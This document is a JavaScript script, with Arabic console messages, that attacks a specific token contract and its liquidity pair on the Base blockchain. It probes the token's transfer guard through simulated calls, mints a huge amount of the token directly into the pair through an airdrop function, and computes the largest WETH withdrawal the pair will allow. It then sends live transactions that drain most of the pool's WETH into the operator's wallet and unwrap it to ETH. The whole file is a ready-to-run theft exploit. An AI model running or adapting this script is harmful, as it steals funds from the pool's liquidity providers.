import fs from "node:fs";
import { JsonRpcProvider, Wallet, keccak256, concat, zeroPadValue, toBeHex, formatUnits, formatEther } from "ethers";

const R = process.env.RPC || "https://mainnet.base.org";
const T = "0xA5a3A7a1dec1a57E41A0Cdd8c2129CfD7B46b592";
const P = "0x69249e64fd8D35036965fa09FadAEdb955D70C31";
const W = "0x4200000000000000000000000000000000000006";
const GS = 0x0e;
const DRY = process.env.DRY === "1";

const j = async (m, pr) =>
  (await fetch(R, { method: "POST", headers: { "content-type": "application/json" },
    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: m, params: pr }) })).json();
const pad = a => "0".repeat(24) + a.slice(2).toLowerCase();
const w32 = n => BigInt(n).toString(16).padStart(64, "0");
const hx  = n => "0x" + BigInt(n).toString(16).padStart(64, "0");
const slot = (a, s) => keccak256(concat([zeroPadValue(a, 32), toBeHex(s, 32)]));
const bn = async (to, data) => { const r = await j("eth_call", [{ to, data }, "latest"]); return r.error ? null : BigInt(r.result); };
const dec = d => { if (!d || !d.startsWith("0x08c379a0")) return "(بلا نص)"; try { const n = parseInt(d.slice(66, 130), 16); return Buffer.from(d.slice(130, 130 + n * 2), "hex").toString(); } catch { return "?"; } };

let ME, W0 = true;
const mkSwap = (o, to) => "0x022c0d9f" + (W0 ? w32(o) + w32(0) : w32(0) + w32(o)) + pad(to) + w32(0x80) + w32(0);
const mkDrop = (to, amt) => "0x983bc41b" + w32(0x60) + pad(to) + w32(amt) + w32(1) + pad(to);

async function main() {
  const p = new JsonRpcProvider(R, 8453, { staticNetwork: true });
  const me = new Wallet(fs.readFileSync(process.env.HOME + "/.pk", "utf8").trim(), p);
  ME = me.address;

  const tk0 = "0x" + (await j("eth_call", [{ to: P, data: "0x0dfe1681" }, "latest"])).result.slice(-40).toLowerCase();
  W0 = tk0 === W.toLowerCase();
  if (!W0) { console.log("WETH ليس token0 — السكربت يعدّل ترتيب المعاملات"); }

  const rv = (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;
  const r0 = BigInt("0x" + rv.slice(2, 66)), r1 = BigInt("0x" + rv.slice(66, 130));
  const rW = W0 ? r0 : r1, rS = W0 ? r1 : r0;

  const balP = await bn(T, "0x70a08231" + pad(P));
  const balME = await bn(T, "0x70a08231" + pad(ME));
  const eth = await p.getBalance(ME);
  const base = BigInt((await j("eth_getBlockByNumber", ["latest", false])).result.baseFeePerGas);

  console.log("الاحتياطي:", formatEther(rW), "WETH |", formatUnits(rS, 9), "SLOP");
  console.log("رصيد الحوض:", formatUnits(balP, 9), "| رصيدك:", formatUnits(balME, 9), "| ETH:", formatEther(eth));
  if (rW === 0n) { console.log("الحوض فارغ"); return; }

  const gME = BigInt((await j("eth_getStorageAt", [T, slot(ME, GS), "latest"])).result);
  const gP  = BigInt((await j("eth_getStorageAt", [T, slot(P, GS), "latest"])).result);
  console.log("gate[ME]:", gME.toString(), "| gate[P]:", gP.toString());

  const tst = async (lbl, from, to, amt, st) => {
    const pr = [{ from, to: T, data: "0xa9059cbb" + pad(to) + w32(amt), gas: "0x30000" }, "latest"];
    if (st) pr.push(st);
    const r = await j("eth_call", pr);
    console.log("   " + (r.error ? "✗ " : "✓ ") + lbl + (r.error ? "  " + dec(r.error.data) : ""));
    return !r.error;
  };

  console.log("\n=== تشخيص البوابة (بلا غاز) ===");
  await tst("transfer كما هي", ME, P, 10n ** 9n);
  await tst("transfer مع gate[ME]=0", ME, P, 10n ** 9n, { [T]: { stateDiff: { [slot(ME, GS)]: hx(0) } } });
  await tst("transfer مع gate[ME]=1", ME, P, 10n ** 9n, { [T]: { stateDiff: { [slot(ME, GS)]: hx(1) } } });
  await tst("pair→ME مع gate[P]=0", P, ME, 10n ** 9n, { [T]: { stateDiff: { [slot(P, GS)]: hx(0) } } });
  await tst("pair→ME مع gate[P]=1", P, ME, 10n ** 9n, { [T]: { stateDiff: { [slot(P, GS)]: hx(1) } } });

  // كشف خانة رصيد الحوض
  let bSlot = 0, ok = false;
  for (const s of [0, 1]) {
    const ov = { [T]: { stateDiff: { [slot(P, s)]: hx(balP + 1n) } } };
    const r = await j("eth_call", [{ to: T, data: "0x70a08231" + pad(P) }, "latest", ov]);
    if (!r.error && BigInt(r.result) === balP + 1n) { bSlot = s; ok = true; break; }
  }
  if (!ok) { console.log("تعذّر كشف خانة الرصيد"); return; }
  console.log("خانة رصيد الحوض:", bSlot);

  const IN = rS * 150n;
  const dropData = mkDrop(P, IN);
  const sd = await j("eth_call", [{ from: ME, to: T, data: dropData, gas: "0x30000" }, "latest"]);
  console.log("\nairdrop", formatUnits(IN, 9), "SLOP إلى الحوض:", sd.error ? "✗ " + dec(sd.error.data) : "✓");
  if (sd.error) return;

  const ovX = { [T]: { stateDiff: { [slot(P, bSlot)]: hx(balP + IN) } } };
  let hi = rW * IN / (rS + IN);
  if (hi > rW - 1n) hi = rW - 1n;
  let lo = 1n, best = 0n;
  for (let i = 0; i < 60 && lo <= hi; i++) {
    const mid = (lo + hi) / 2n;
    const r = await j("eth_call", [{ from: ME, to: P, data: mkSwap(mid, ME), gas: "0x30000" }, "latest", ovX]);
    if (r.error) hi = mid - 1n; else { best = mid; lo = mid + 1n; }
  }
  if (best === 0n) { console.log("swap لا يمر — الحارس أشد"); return; }
  const out = best * 98n / 100n;
  console.log("أقصى مخرج مقبول:", formatEther(best), "WETH → سنسحب", formatEther(out), "(" + (best * 100n / rW).toString() + "% من الحوض)");

  const sim = await j("eth_call", [{ from: ME, to: P, data: mkSwap(out, ME), gas: "0x40000" }, "latest", ovX]);
  console.log("محاكاة السحب:", sim.error ? "✗ " + dec(sim.error.data) : "✓");
  if (sim.error) return;

  const est = await j("eth_estimateGas", [{ from: ME, to: P, data: mkSwap(out, ME) }, "latest", ovX]);
  let gasSwap = est.error ? 180000n : BigInt(est.result) * 13n / 10n + 15000n;
  const gasDrop = 110000n, gasUnwrap = 55000n;
  let mf = base * 12n / 10n + 20000n;
  let need = (gasDrop + gasSwap) * mf;
  const withUnwrap = eth >= need + gasUnwrap * mf;
  console.log("غاز:", formatEther(need), "| متاح:", formatEther(eth), "| فك WETH:", withUnwrap ? "نعم" : "لا");
  if (need > eth) { console.log("ناقص:", formatEther(need - eth), "ETH"); return; }
  if (DRY) { console.log("جاهز."); return; }

  const send = async (to, data, gas) => {
    for (let i = 0; i < 3; i++) {
      try {
        const rc = await (await me.sendTransaction({ to, data, gasLimit: gas, maxFeePerGas: mf, maxPriorityFeePerGas: 0n })).wait();
        if (rc.status === 1) return true;
      } catch (e) { console.log("   خطأ:", (e.shortMessage || e.message).slice(0, 80)); }
      if (i < 2) await new Promise(r => setTimeout(r, 6000));
    }
    return false;
  };

  console.log("\n1) ضخ الفائض إلى الحوض...");
  const before = await bn(T, "0x70a08231" + pad(P));
  if (!await send(T, dropData, gasDrop)) return;
  const gained = (await bn(T, "0x70a08231" + pad(P))) - before;
  console.log("   زيادة فعلية:", formatUnits(gained, 9), "SLOP");
  if (gained === 0n) {
    const d2 = await j("eth_call", [{ from: ME, to: T, data: mkDrop(ME, 10n ** 9n), gas: "0x30000" }, "latest"]);
    console.log("   airdrop إلى محفظتك مباشرة:", d2.error ? "✗ " + dec(d2.error.data) : "✓ (الوجهة نفسها لا تُسكّ — جرّب لاحقاً)");
    return;
  }

  const mx2 = async () => {
    const rr = (await j("eth_call", [{ to: P, data: "0x0902f1ac" }, "latest"])).result;
    const w = BigInt("0x" + rr.slice(2, 66)), s = BigInt("0x" + rr.slice(66, 130));
    const cur = (await bn(T, "0x70a08231" + pad(P))) - s;
    if (cur <= 0n) return 0n;
    let h = cur * w / (s + cur), l = 1n, b = 0n;
    if (h > w - 1n) h = w - 1n;
    for (let i = 0; i < 50 && l <= h; i++) {
      const m = (l + h) / 2n;
      const r = await j("eth_call", [{ from: ME, to: P, data: mkSwap(m, ME), gas: "0x30000" }, "latest"]);
      if (r.error) h = m - 1n; else { b = m; l = m + 1n; }
    }
    return b;
  };

  console.log("2) قياس الحالة الحقيقية...");
  const mx = await mx2();
  if (mx === 0n) { console.log("   لا قيمة تمر"); return; }
  const o2 = mx * 98n / 100n;
  console.log("   أقصى:", formatEther(mx), "→ أرسل", formatEther(o2));

  console.log("3) السحب...");
  if (!await send(P, mkSwap(o2, ME), gasSwap)) return;

  const wb = await bn(W, "0x70a08231" + pad(ME));
  console.log("\n>>> WETH عندك:", formatEther(wb));
  if (wb > 0n && eth >= need + gasUnwrap * mf) {
    console.log("4) فك إلى ETH...");
    await send(W, "0x2e1a7d4d" + w32(wb), gasUnwrap);
  }
  console.log(">>> ETH عندك:", formatEther(await p.getBalance(ME)));
  console.log(">>> WETH متبقٍ بالحوض:", formatEther(await bn(W, "0x70a08231" + pad(P))));
}

main().catch(e => { console.error("فشل:", e.shortMessage || e.message); process.exit(1); });
